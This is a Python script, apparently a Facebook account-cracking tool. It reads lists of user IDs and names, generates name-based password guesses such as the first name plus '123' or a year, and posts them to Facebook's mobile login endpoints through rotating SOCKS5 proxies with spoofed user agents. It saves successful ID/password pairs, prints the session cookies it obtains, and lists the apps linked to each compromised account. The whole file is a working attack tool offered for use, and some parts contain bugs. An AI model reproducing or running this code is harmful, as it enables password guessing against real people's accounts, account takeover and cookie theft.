
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/casals-ar/proxy.casals.ar/main/socks5').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m[Mr.IPYTHONI]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia 3110 Build/'
	e=random.randrange(1, 10000)
	f='AppleWebKit/601.46 (KHTML, like Gecko)  Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 9)
	i=random.randrange(1, 9)
	j=random.randrange(1, 9)
	k='Mobile Safari/533.2'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-US',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Samsung A32 5G",
									"Redmi 5A",
									"Mi 9 SE",
									"Nokia 3110",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"POCO X5 Pro 5G",
									"Redmi 5 Plus",
									"Huawei Y9s",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(1,100000)
	g=random.randrange(1,10000)
	h=random.randrange(1,1000)
	i=random.randrange(1,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/10.22.0.3-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.16.2-gn",
									"XiaoMi/MiuiBrowser/13.26.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Android; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/601.44 (KHTML, like Gecko)  Chrome/{g}.0.{h}.{i} Mobile Safari/601.3 {j}'
	kondom2=f'Mozilla/5.0 (Android; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/602.23 (KHTML, like Gecko)  Chrome/{g}.0.{h}.{i} Mobile Safari/600.5 {j}'
	uaku2 = random.choice([kondom1,kondom2])
	ugen.append(uaku2)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def ARA(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    clear()
    print(f"""{asu}MR \033[1;37m 
 Author    {M}:\033[1;37m ARA  
{asu}---------------------------------------------------{P}""")
os.system('clear')
banner()
#------------------[ BAGIAN-MENU ]----------------#
def menu():
	os.system('clear')
	banner()
	print(f'│ ╰─[{H}MENU{N}]──────────────────────────────────╯')
	print(f'{N}├───[{h}1{N}] CRACK BA FILE	')
	print(f'{N}├──╭[{h}HALLBZHERA{x}]──────────────────────────────────────────────')
	_____IKFAR__IFC_____ = input(f'\r│  ╰─➣{h} ')
	if _____IKFAR__IFC_____ in ['1']:
		crack_file()

#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
            try:
                fileX = input (f'{P}File Location {M}:{H} ')
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               exit(f"\n{M}File %s not found"%(fileX))
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{N}├───────────────────────────────────────────────────────')
	print(f'{N}├───[{H}1{N}] KON ')
	print(f'{N}├───[{H}2{N}] TAZA {H}{N}')
	print(f'{N}├───[{H}3{N}] HARDWKI {H}{N}')
	print(f'{N}├──╭[{h}JOR HALLBZHERA{N}]────────────────────────────────────────────')
	hu = input(f'│  ╰─➣{h} ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{N}├───[{H}+{N}] Pilih Yang Bener Kontooll ')
		exit()
	print(f'{N}├───────────────────────────────────────────────────────')
	print(f'{N}├───[{H}1{N}] Mobile {H}[1 LEDA 7AQT NABE]{N}')
	print(f'{N}├───[{H}2{N}] Mbasic ')
	print(f'├──╭[{h}JORE HALLBZHERA{N}]────────────────────────────────────────────')
	hc = input(f'│  ╰─➣{h} ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print(f'{N}│')
	passwrd()
	ara
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print (' fast ')
	hc = input(f'│  ╰─➣{h} ')
	if hc in ['1','01']:
		ara()
	
		
def ara():
	ARA(f'{N}│ ╭───────────────────────────────────────────────────────╮\n{N}│ │ [{h}•{x}] ARA {h}OK{x} SAVE IN : {h}%s{x}  {N}│'%(okc))
	ARA(f'{N}│ │ [{k}•{x}] ARA {k}CP{x} SAVE IN : {k}%s{x}  {N}│'%(cpc))
	ARA(f'{N}│ ╰────────[{k}✨ON/OF AIRPLANE MODE EVERY 500 ID✨{N}]─────────╯') #%(okc,cpc))
	ARA(f"│")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'0770')
					pwv.append(frs+'112233')			
					pwv.append(frs+'11223344')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+frs)
					pwv.append(frs+'0780')
					pwv.append(frs+'123123')
					pwv.append(frs+'0771')
					pwv.append(frs+'0751')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2023')
					pwv.append(frs+'2024')
					pwv.append(frs+'2010')
					pwv.append(frs+'2025')
					pwv.append(frs+'2026')
					pwv.append(frs+'11223')
					pwv.append(frs+'2009')
					pwv.append(frs+'2008')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'0770')
					pwv.append(frs+'112233')			
					pwv.append(frs+'11223344')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+frs)
					pwv.append(frs+'0780')
					pwv.append(frs+'123123')
					pwv.append(frs+'0771')
					pwv.append(frs+'0751')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2023')
					pwv.append(frs+'2024')
					pwv.append(frs+'2010')
					pwv.append(frs+'2025')
					pwv.append(frs+'2026')
					pwv.append(frs+'11223')
					pwv.append(frs+'2009')
					pwv.append(frs+'2008')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackmbasic,idf,pwv,nmf)
	print(f'{N}╭───[{b}•{x}]{h} OK : {h}%s '%(ok))
	print('│')
	print(f'├───[{b}•{x}] Crack Again ( Y/t ) ? ')
	woi = input(f'╰───[{b}•{x}] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crackmobile_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r\x1b[1;90m[%s\x1b[1;91mARA\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}╭───[ARA-CP]\n└── ID: {k}{idf}{N}\n └──PASS: {k}{pw}{N}\n   └──{m} {ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}╭───[ARA-OK]\n└── ID:  {H}{idf}{N}\n  └── PASS:  {H}{pw}{N}\n  └── Cookie: {H}{kuki} ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r\x1b[1;90m[%s\x1b[1;91mARA\x1b[1;90m]-[\x1b[1;96m%s\x1b[1;90m/\x1b[1;95m%s\x1b[1;90m]-[\x1b[1;92mOK:%s\x1b[1;90m]-[\x1b[1;93mCP:%s\x1b[1;90m]-[\x1b[1;94m%s%s\x1b[1;90m]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{N}╭───[ARA-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{N}╭───[ARA-OK]\n└── ID:  {H}{idf}{N}\n  └── PASS:  {H}{pw}{N}\n  └── Cokkie: {H}{kuki} ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_ARA(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = random.choice(ugen)
	headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = random.choice(ugen)
			ses = requests.Session()
			headers = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A326B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_ARA(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
                                                       
#-----------------------[ SYSTEM-CONTROL ]--------------------#m
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()
